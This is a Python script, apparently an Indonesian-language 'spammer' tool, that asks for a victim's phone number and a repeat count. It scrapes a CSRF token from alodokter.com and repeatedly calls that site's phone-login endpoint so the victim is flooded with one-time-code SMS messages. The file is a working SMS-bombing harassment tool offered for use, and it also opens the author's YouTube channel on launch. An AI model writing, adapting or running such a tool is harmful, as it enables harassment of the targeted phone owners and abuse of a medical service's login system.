import os,json,shutil,requests,re,sys,time
from bs4 import BeautifulSoup as sup

os.system('clear')
print('\33[36;1mSubrek Dulu \33[37;1mSlurr, \33[36;1mGk Subrek \33[37;1mGk Kawan \33[36;1m!!')
os.system('xdg-open https://youtube.com/channel/UCyOb9Jo3A0ZtUx_DcD4W2pQ')
time.sleep(7)
try:
	os.mkdir('__pycache__')
except:
	pass
try:
	shutil.rmtree('__pycache__')
except:
	pass
def Sukses(nomor,u):
	print (f'[\33[0;32m√\33[37;1m] \33[0;32mSukses \33[37;1mTerkirim Ke \33[31;1m{nomor}')

class Spammer:
	def __init__(self):
		self.c = requests.Session()
	def alodok(self,nomor,jumlah):
		for i in range(1,int(jumlah)+1):
			r = requests.get('https://www.alodokter.com/login-alodokter')
			parser = sup(r.text,features='html.parser')
			token = parser.find('meta',{'name':'csrf-token'})['content']
			head = {'accept':'application/json','x-csrf-token':token,'user-agent':'Mozilla/5.0 (Linux; Android 9; RMX1911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36','content-type':'application/json','origin':'https://www.alodokter.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','referer':'https://www.alodokter.com/login-alodokter','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			req = requests.post('https://www.alodokter.com/login-with-phone-number',headers=head,json=
			{'user':{'phone':nomor}}).json()
			#print (req.text)
			if 'success' in req['status']:
				Sukses(nomor,i)
				time.sleep(1)
def update():
	r = requests.get('http://auxcrewtbdrpg.com/update.txt')
	if '1.3' in str(r.text):
		return r.text.replace('\\033','\033').replace('\\n','\n')
	else:
		return ''
while True:
	os.system('clear')
	try:
		print (f'''
   \33[31;1m _    _           _       _    _
   / \  | | ___   __| | ___ | | _| |_ ___ _ __
  / _ \ | |/ _ \ / _` |/ _ \| |/ / __/ _ \ '__|\33[37;1m
 / ___ \| | (_) | (_| | (_) |   <| ||  __/ |
/_/   \_\_|\___/ \__,_|\___/|_|\_|\\__\___|_|


\33[36;1mAuthor \33[31;1m: \33[37;1mFirzzz
\33[36;1mYoutube \33[31;1m: \33[37;1mFirzz Tutorial
----------------------------

      \33[31;1m>  \33[37;1m01 \33[31;1m: \33[37;1mGas Spam [\33[36;1mAlodoc\33[37;1m]
      \33[31;1m>  \33[37;1m00 \33[31;1m: \33[37;1mExit
\n''')
		pil = input(f'[\33[36;1m±\33[37;1m] Pilih \33[31;1m: \33[37;1m')
		if pil == '1' or pil == '01':
			nomor = input(f'[\33[36;1m±\33[37;1m] Nomor Target [\33[31;1m08xx\33[37;1m] \33[31;1m: \33[37;1m')
			if nomor == '':
				exit(f'[!] Di isi dulu Gan!')
			jumlah = input(f'[\33[36;1m±\33[37;1m] Jumlah spam \33[31;1m: \33[37;1m')
			if jumlah == '':
				exit(f'[!] Di isi dulu Gan!!')
			print()
			Spammer().alodok(nomor,jumlah)
		elif pil == '0' or pil == '00':
                        exit("Exit")
		else:
			print(f'[!] Pilihan Tidak Ada! ')
		tanya = input('\n\33[37;1m[\33[36;1m?\33[37;1m] Coba Lagi (\33[0;32my\33[37;1m/\33[31;1mn\33[37;1m) \33[31;1m: \33[37;1m')
		if tanya.lower() == 'n':
		        exit()
	except KeyboardInterrupt:
			exit()
	except Exception as J:
		exit(J)
